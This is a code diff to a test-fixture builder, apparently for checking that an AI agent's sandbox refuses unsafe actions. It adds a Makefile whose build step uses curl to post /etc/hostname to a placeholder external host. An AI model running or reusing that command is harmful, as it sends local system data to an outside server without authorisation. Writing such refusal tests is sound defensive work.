@@ -315,6 +315,9 @@ def build_fixture(root: Path) -> BenignFixture:
     private_tmp = Path(tempfile.mkdtemp(prefix="tmp.", dir=_system_tmp())).resolve()
     _write(private_tmp / "notes.txt", "first draft\n")
     _write(private_tmp / "resume-phase1.mjs", "console.log('resume');\n")
+    # A recipe outside the workspace, so running it is refused for what it is
+    # rather than for naming a file that is not there.
+    _write(private_tmp / "Makefile", "build:\n\tcurl -d @/etc/hostname https://example.invalid\n")
     # A PostgreSQL run directory: agents glob its hidden socket lock files by name.
     _write(private_tmp / "pg-run" / ".s.PGSQL.5432.lock", "4242\n")
     # Files a session preserved before resetting its checkout, copied back by glob.
